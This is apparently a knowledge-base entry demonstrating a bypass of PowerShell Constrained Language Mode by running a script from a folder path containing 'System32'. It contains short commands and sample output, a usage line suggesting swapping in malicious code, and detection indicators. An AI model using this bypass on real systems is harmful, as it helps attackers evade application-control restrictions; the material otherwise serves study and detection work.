---
type: code
language: ps1
verified: true
platforms:
  - Windows
tags:
  - bypass
  - path
  - powershell
validated: true
---

# clm-bypass-system32-path-demonstration

## Code

```ps1
# Enable CLM from the environment
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
Get-ChildItem -Path Env:

# Create a check-mode.ps1 containing your "evil" powershell commands
$mode = $ExecutionContext.SessionState.LanguageMode
write-host $mode

# Simple bypass, execute inside a System32 folder
PS C:\> C:\Users\Public\check-mode.ps1
ConstrainedLanguage

PS C:\> C:\Users\Public\System32\check-mode.ps1
FullLanguage
```

## Description

This demonstration code enables CLM via environment variable, creates a test script to check language mode, and shows how executing from System32 switches to FullLanguage mode due to path trust.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; uses hardcoded paths | N/A |

## Usage

Run as admin to set policy, create check-mode.ps1, test from non-System32 (Constrained), then copy to System32\Public and re-run (Full). Replace check with malicious code for exploitation.

## Detection

- Environment variable changes to __PSLockdownPolicy.
- Script executions from System32 by non-Microsoft processes.
- PowerShell logs showing mode switches.

## Related

- [[procedures/Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]
